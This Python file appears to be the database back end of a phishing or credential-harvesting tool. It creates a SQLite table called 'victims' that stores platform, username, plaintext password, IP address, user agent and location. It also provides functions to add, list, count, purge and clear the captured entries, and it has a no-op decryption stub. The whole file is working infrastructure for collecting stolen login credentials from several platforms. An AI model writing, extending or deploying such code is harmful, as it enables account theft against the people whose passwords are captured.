import os
import sqlite3
from datetime import datetime, timedelta

BASE_DIR = os.path.dirname(os.path.abspath(__file__))


def _db_path() -> str:
    from config import Config

    return Config.DB_PATH


def __getattr__(name: str):
    if name == "DB_PATH":
        return _db_path()
    raise AttributeError(f"module {__name__!r} has no attribute {name!r}")


def _connect() -> sqlite3.Connection:
    auth_dir = os.path.dirname(_db_path())
    if auth_dir and not os.path.exists(auth_dir):
        os.makedirs(auth_dir)
    return sqlite3.connect(_db_path())


def init_db():
    conn = _connect()
    cursor = conn.cursor()

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            platform TEXT,
            username TEXT,
            password TEXT,
            ip TEXT,
            timestamp DATETIME,
            user_agent TEXT,
            location TEXT
        )
    """)

    conn.commit()
    conn.close()

    purge_old_victims()


def purge_old_victims() -> int:
    """Delete victim rows older than RETENTION_DAYS (0 = disabled). Returns rows removed."""
    from config import Config

    days = Config.RETENTION_DAYS
    if days <= 0:
        return 0

    cutoff = (datetime.now() - timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
    conn = _connect()
    cursor = conn.execute("DELETE FROM victims WHERE timestamp < ?", (cutoff,))
    deleted = cursor.rowcount
    conn.commit()
    conn.close()
    return deleted


def _decrypt_victim_row(row: tuple) -> tuple:
    return row

def add_victim(
    platform, username, password, ip, user_agent="Unknown", location="Unknown"
):
    conn = _connect()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    conn.execute(
        """
        INSERT INTO victims (platform, username, password, ip, timestamp, user_agent, location)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    """,
        (platform, username, password, ip, timestamp, user_agent, location),
    )
    conn.commit()
    conn.close()


def get_all_victims():
    conn = _connect()
    rows = conn.execute("SELECT * FROM victims ORDER BY timestamp DESC").fetchall()
    conn.close()
    return [_decrypt_victim_row(row) for row in rows]


def delete_victim(victim_id):
    conn = _connect()
    conn.execute("DELETE FROM victims WHERE id = ?", (victim_id,))
    conn.commit()
    conn.close()


def clear_all_victims():
    conn = _connect()
    conn.execute("DELETE FROM victims")
    conn.commit()
    conn.close()


def get_stats():
    conn = _connect()
    total = conn.execute("SELECT COUNT(*) FROM victims").fetchone()[0]
    platform_stats = conn.execute(
        "SELECT platform, COUNT(*) FROM victims GROUP BY platform"
    ).fetchall()
    conn.close()
    return {"total": total, "platforms": platform_stats}
